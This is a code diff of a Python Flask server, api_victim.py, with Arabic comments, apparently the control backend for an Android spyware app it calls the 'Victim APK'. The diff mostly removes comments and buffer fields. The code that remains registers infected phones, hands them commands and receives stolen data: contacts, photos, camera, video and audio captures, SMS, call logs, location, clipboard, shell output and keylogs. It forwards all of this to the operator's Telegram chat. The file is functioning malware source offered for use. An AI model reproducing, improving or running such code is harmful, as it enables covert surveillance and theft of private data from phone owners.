@@ -1,7 +1,6 @@
 # api_victim.py
 # ============================================================
 # API للضحية (Victim APK) — v4
-# يجمع البيانات في buffers ويُرسل ملف واحد منظم
 # ============================================================
 
 import io
@@ -19,36 +18,16 @@ from imports_manager import (
 )
 
 
-# ============================================================
-# ★★★ Buffers — لتجميع البيانات قبل الإرسال ★★★
-# ============================================================
 class VictimBuffer:
-    """يجمع بيانات ضحية واحدة"""
     def __init__(self, victim_id, chat_id, victim_name):
         self.victim_id = victim_id
         self.chat_id = chat_id
         self.victim_name = victim_name
-        
-        # Contacts
         self.contacts = []
         self.contacts_total = 0
-        self.contacts_started = 0
-        
-        # Photos
-        self.photos = []  # list of (name, bytes)
+        self.photos = []
         self.photos_total = 0
-        self.photos_started = 0
-        
-        # SMS / Calls / Apps
-        self.sms = []
-        self.calls = []
-        self.apps = []
-        
-        # Lock + timing
         self.lock = threading.Lock()
-        self.last_update = time.time()
-        self.contacts_timer = None
-        self.photos_timer = None
 
 
 _buffers = {}
@@ -56,7 +35,6 @@ _buffers_lock = threading.Lock()
 
 
 def _get_buffer(victim_id, chat_id, victim_name):
-    """يجلب أو ينشئ buffer لضحية"""
     with _buffers_lock:
         if victim_id not in _buffers:
             _buffers[victim_id] = VictimBuffer(victim_id, chat_id, victim_name)
@@ -66,22 +44,7 @@ def _get_buffer(victim_id, chat_id, victim_name):
         return buf
 
 
-def _cleanup_buffer(victim_id):
-    """يحذف buffer بعد الإرسال"""
-    with _buffers_lock:
-        if victim_id in _buffers:
-            try:
-                del _buffers[victim_id]
-            except Exception:
-                pass
-
-
-# ============================================================
-# ★★★ دوال الإرسال النهائي ★★★
-# ============================================================
-
 def _send_contacts_batch(victim_id):
-    """يرسل جهات الاتصال مجمعة في ملف"""
     with _buffers_lock:
         buf = _buffers.get(victim_id)
         if not buf or not buf.contacts:
@@ -89,12 +52,10 @@ def _send_contacts_batch(victim_id):
         contacts = list(buf.contacts)
         total = buf.contacts_total or len(contacts)
         buf.contacts = []
-        buf.contacts_started = 0
     
     try:
         cid = int(buf.chat_id) if str(buf.chat_id).isdigit() else buf.chat_id
         
-        # ★ أنشئ ملف منظم
         lines = [
             f"📇 جهات الاتصال — {buf.victim_name}",
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
@@ -111,9 +72,7 @@ def _send_contacts_batch(victim_id):
         
         content = "\n".join(lines)
         
-        # لو الملف كبير → قسّمه لأجزاء
         if len(content) > 3500:
-            # أرسل كملف
             buf_io = io.BytesIO(content.encode('utf-8'))
             buf_io.name = f"contacts_{buf.victim_name[:20]}.txt"
             bot.send_document(
@@ -123,7 +82,6 @@ def _send_contacts_batch(victim_id):
                 parse_mode="Markdown"
             )
         else:
-            # أرسل كرسالة
             bot.send_message(
                 cid,
                 f"📇 **جهات الاتصال ({len(contacts)}/{total})**\n"
@@ -131,13 +89,12 @@ def _send_contacts_batch(victim_id):
                 parse_mode="Markdown"
             )
         
-        print(f"[+] Contacts batch sent: {len(contacts)} to {cid}")
+        print(f"[+] Contacts batch sent: {len(contacts)}")
     except Exception as e:
         print(f"[-] send contacts batch error: {e}")
 
 
 def _send_photos_batch(victim_id):
-    """يرسل الصور مجمعة في ZIP أو منفصلة"""
     with _buffers_lock:
         buf = _buffers.get(victim_id)
         if not buf or not buf.photos:
@@ -145,12 +102,10 @@ def _send_photos_batch(victim_id):
         photos = list(buf.photos)
         total = buf.photos_total or len(photos)
         buf.photos = []
-        buf.photos_started = 0
     
     try:
         cid = int(buf.chat_id) if str(buf.chat_id).isdigit() else buf.chat_id
         
-        # ★ لو 3 صور أو أقل: أرسل صور مباشرة
         if len(photos) <= 3:
             for i, (name, img_bytes) in enumerate(photos, 1):
                 try:
@@ -165,7 +120,6 @@ def _send_photos_batch(victim_id):
                 except Exception as e:
                     print(f"[-] photo {i} error: {e}")
         else:
-            # ★ لو أكثر: أرسل ZIP
             import zipfile
             zip_buffer = io.BytesIO()
             
@@ -184,22 +138,16 @@ def _send_photos_batch(victim_id):
                 parse_mode="Markdown"
             )
         
-        print(f"[+] Photos batch sent: {len(photos)} to {cid}")
+        print(f"[+] Photos batch sent: {len(photos)}")
     except Exception as e:
         print(f"[-] send photos batch error: {e}")
 
 
-# ============================================================
-# ★★★ API Init ★★★
-# ============================================================
 def init_victim_api(app, bot_instance=None):
     global bot
     if bot_instance:
         bot = bot_instance
 
-    # ============================================================
-    # Register
-    # ============================================================
     @app.route('/apk/victim/register', methods=['POST'])
     def victim_register():
         try:
@@ -252,9 +200,6 @@ def init_victim_api(app, bot_instance=None):
             print(f"[-] register error: {e}")
             return jsonify({"error": str(e)}), 500
 
-    # ============================================================
-    # Poll
-    # ============================================================
     @app.route('/apk/victim/poll', methods=['GET'])
     def victim_poll():
         try:
@@ -280,9 +225,6 @@ def init_victim_api(app, bot_instance=None):
             print(f"[-] poll error: {e}")
             return jsonify({"commands": []}), 200
 
-    # ============================================================
-    # Data
-    # ============================================================
     @app.route('/apk/victim/data', methods=['POST'])
     def victim_data():
         try:
@@ -310,9 +252,6 @@ def init_victim_api(app, bot_instance=None):
             cid = int(chat_id) if str(chat_id).isdigit() else chat_id
             print(f"[<<] {dtype} from {victim_name} ({victim_id[:8]})")
 
-            # ============================================================
-            # Camera Photo (فوري)
-            # ============================================================
             if dtype == "camera_photo":
                 img_data = data.get('image', '')
                 cam_name = data.get('camera_name', '')
@@ -331,17 +270,9 @@ def init_victim_api(app, bot_instance=None):
                                     f"🆔 `{victim_id[:8]}`",
                             parse_mode="Markdown"
                         )
-                        print(f"[+] Photo sent to {cid}")
                     except Exception as e:
                         print(f"[-] photo error: {e}")
-                        try:
-                            bot.send_message(cid, f"❌ صورة فاشلة: {e}")
-                        except Exception:
-                            pass
 
-            # ============================================================
-            # ★★★ Photos — تجميع في buffer ★★★
-            # ============================================================
             elif dtype == "photo_single":
                 img_data = data.get("image", "")
                 img_name = data.get("name", "photo.jpg")
@@ -357,22 +288,14 @@ def init_victim_api(app, bot_instance=None):
                         with buf.lock:
                             buf.photos.append((img_name, img_bytes))
                             buf.photos_total = total
-                            buf.photos_started = max(buf.photos_started, index + 1)
                         
-                        print(f"[+] Photo buffered: {img_name} ({index+1}/{total})")
-                        
-                        # ★ إرسال كل 3 صور
                         if len(buf.photos) >= 3:
                             _send_photos_batch(victim_id)
                     except Exception as e:
                         print(f"[-] photo_single error: {e}")
 
-            # ============================================================
-            # Photos Done
-            # ============================================================
             elif dtype == "photos_done":
                 total = data.get("total", 0)
-                # أرسل باقي الصور
                 _send_photos_batch(victim_id)
                 
                 try:
@@ -385,29 +308,20 @@ def init_victim_api(app, bot_instance=None):
                 except Exception:
                     pass
 
-            # ============================================================
-            # ★★★ Contacts — تجميع في buffer ★★★
-            # ============================================================
             elif dtype == "contacts":
                 contact = data.get("contact", None)
                 index = data.get("index", 0)
                 total = data.get("total", 0)
                 
-                # تجميع
                 if contact:
                     buf = _get_buffer(victim_id, cid, victim_name)
                     with buf.lock:
                         buf.contacts.append(contact)
                         buf.contacts_total = total
-                        buf.contacts_started = max(buf.contacts_started, index + 1)
                     
-                    # ★ إرسال كل 50 جهة
                     if len(buf.contacts) >= 50:
                         _send_contacts_batch(victim_id)
 
-            # ============================================================
-            # Contacts Done
-            # ============================================================
             elif dtype == "contacts_done":
                 total = data.get("total", 0)
                 _send_contacts_batch(victim_id)
@@ -422,9 +336,6 @@ def init_victim_api(app, bot_instance=None):
                 except Exception:
                     pass
 
-            # ============================================================
-            # Video
-            # ============================================================
             elif dtype == "video_record":
                 video_data = data.get('video', '')
                 duration = data.get('duration', 0)
@@ -443,9 +354,6 @@ def init_victim_api(app, bot_instance=None):
                     except Exception as e:
                         print(f"[-] video error: {e}")
 
-            # ============================================================
-            # Audio
-            # ============================================================
             elif dtype == "audio_record":
                 audio_data = data.get('audio', '')
                 duration = data.get('duration', 0)
@@ -464,9 +372,6 @@ def init_victim_api(app, bot_instance=None):
                     except Exception as e:
                         print(f"[-] audio error: {e}")
 
-            # ============================================================
-            # Device Info
-            # ============================================================
             elif dtype == "device_info":
                 text = (
                     f"📱 **معلومات الجهاز**\n"
@@ -478,9 +383,6 @@ def init_victim_api(app, bot_instance=None):
                 )
                 bot.send_message(cid, text, parse_mode="Markdown")
 
-            # ============================================================
-            # Battery
-            # ============================================================
             elif dtype == "battery":
                 level = data.get('level', 0)
                 charging = data.get('charging', False)
@@ -492,9 +394,6 @@ def init_victim_api(app, bot_instance=None):
                 )
                 bot.send_message(cid, text, parse_mode="Markdown")
 
-            # ============================================================
-            # SMS
-            # ============================================================
             elif dtype == "sms":
                 sms_list = data.get("sms", [])
                 if not sms_list:
@@ -513,7 +412,6 @@ def init_victim_api(app, bot_instance=None):
                     
                     msg = "\n".join(lines)
                     
-                    # لو كبيرة → ملف
                     if len(msg) > 3500:
                         buf_io = io.BytesIO(msg.encode('utf-8'))
                         buf_io.name = f"sms_{victim_name[:20]}.txt"
@@ -525,9 +423,6 @@ def init_victim_api(app, bot_instance=None):
                     else:
                         bot.send_message(cid, f"```\n{msg}\n```", parse_mode="Markdown")
 
-            # ============================================================
-            # Calls
-            # ============================================================
             elif dtype == "call_log":
                 calls = data.get("calls", [])
                 type_map = {"1": "📥", "2": "📤", "3": "❌"}
@@ -543,9 +438,6 @@ def init_victim_api(app, bot_instance=None):
                 
                 bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
 
-            # ============================================================
-            # Apps
-            # ============================================================
             elif dtype == "apps":
                 apps = data.get("apps", [])
                 lines = [
@@ -566,9 +458,6 @@ def init_victim_api(app, bot_instance=None):
                 else:
                     bot.send_message(cid, msg, parse_mode="Markdown")
 
-            # ============================================================
-            # Location
-            # ============================================================
             elif dtype == "location":
                 lat = data.get("lat")
                 lng = data.get("lng")
@@ -583,9 +472,6 @@ def init_victim_api(app, bot_instance=None):
                 else:
                     bot.send_message(cid, f"❌ لا يوجد موقع من {victim_name}")
 
-            # ============================================================
-            # Clipboard
-            # ============================================================
             elif dtype == "clipboard":
                 text = data.get("text", "")
                 if text:
@@ -597,9 +483,6 @@ def init_victim_api(app, bot_instance=None):
                 else:
                     bot.send_message(cid, f"📋 الحافظة فاضية — {victim_name}")
 
-            # ============================================================
-            # Photos List (فقط أسماء)
-            # ============================================================
             elif dtype == "photos":
                 photos = data.get("photos", [])
                 lines = [f"🖼️ **الصور ({len(photos)})** — `{victim_name}`"]
@@ -607,9 +490,6 @@ def init_victim_api(app, bot_instance=None):
                     lines.append(f"• `{p.get('path')}`")
                 bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
 
-            # ============================================================
-            # Shell
-            # ============================================================
             elif dtype == "shell_result":
                 cmd = data.get("command", "")
                 output = data.get("output", "")
@@ -620,9 +500,6 @@ def init_victim_api(app, bot_instance=None):
                     parse_mode="Markdown"
                 )
 
-            # ============================================================
-            # Command Result
-            # ============================================================
             elif dtype == "cmd_result":
                 action = data.get("action", "")
                 status = data.get("status", "")
@@ -636,9 +513,6 @@ def init_victim_api(app, bot_instance=None):
                         parse_mode="Markdown"
                     )
 
-            # ============================================================
-            # Keylog
-            # ============================================================
             elif dtype == "keylog":
                 text = data.get("text", "")
                 if text.strip():
